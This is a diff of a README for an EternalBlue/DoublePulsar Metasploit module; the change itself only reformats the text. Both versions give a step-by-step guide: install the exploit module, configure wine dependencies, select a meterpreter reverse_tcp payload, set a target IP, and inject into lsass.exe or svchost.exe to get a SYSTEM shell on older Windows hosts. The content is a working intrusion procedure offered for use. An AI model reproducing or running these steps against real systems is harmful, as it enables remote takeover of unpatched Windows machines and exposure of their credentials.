@@ -8,23 +8,23 @@ One thing I could never find was a full setup guide.  I had to piece this togeth
 
 # Installation Setup
 
-1.) git clone https://github.com/w0rtw0rt/EternalBlue to any directory
-2.) Place eternalblue-doublepulsar.rb file into the /usr/share/metasploit-framework/modules/exploits/windows/smb folder
-3.) open terminal
-4.) dpkg --add-architecture i386 && apt-get update && apt-get install wine32
-5.) add directory in your home directory for .wine (mkdir .wine)
-6.) cd .wine 
-7.) mkdir drive_c
-8.) open metasploit (msfconsole)
-9.) use exploit/windows/smb/eternalblue_doublepulsar (should tab autocomplete if you placed in proper directory)
-10.) set proper payload for arch (windows/x64/meterpreter/reverse_tcp vs windows/meterpreter/reverse_tcp)
-11.) show options
-12.) set DOUBLEPULSARPATH to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
-13.) set ETERNALBLUEPATH to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
-14.) set RHOST *target IP*
-15.) set TARGETARCHITECTURE *x86 or x64*
-16.) set TARGET *target OS - Windows 2008/7 down to 2003/XP*
-17.) set PROCESSINJECT *running process - use lsass.exe (x64) or svchost.exe (x86) or explorer.exe if user is logged in*
+	1.) git clone https://github.com/w0rtw0rt/EternalBlue to any directory
+	2.) Place eternalblue-doublepulsar.rb file into the /usr/share/metasploit-framework/modules/exploits/windows/smb folder
+	3.) open terminal
+	4.) dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+	5.) add directory in your home directory for .wine (mkdir .wine)
+	6.) cd .wine 
+	7.) mkdir drive_c
+	8.) open metasploit (msfconsole)
+	9.) use exploit/windows/smb/eternalblue_doublepulsar (should tab autocomplete if you placed in proper directory)
+	10.) set proper payload for arch (windows/x64/meterpreter/reverse_tcp vs windows/meterpreter/reverse_tcp)
+	11.) show options
+	12.) set **DOUBLEPULSARPATH** to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
+	13.) set **ETERNALBLUEPATH** to directory your DEPS folder resides (default is root/Eternalblue-Doublepulsar-Metasploit/deps/)
+	14.) set **RHOST** *target IP*
+	15.) set **TARGETARCHITECTURE** *x86 or x64*
+	16.) set **TARGET** *target OS - Windows 2008/7 down to 2003/XP*
+	17.) set **PROCESSINJECT** *running process - use lsass.exe (x64) or svchost.exe (x86) or explorer.exe if user is logged in*
 
 At this point, when you run this module for the very first time, wine will initialize and the exploit will fail stating that certain dependencies could not be run.  After the initialization, run the module again and all dependencies will be set up.  The module should complete and if your target is vulnerable, it will open the back door and inject the auto-generated payload to the target.  This should bring back a meterpreter shell with system level access (NTAuthority/System).
 
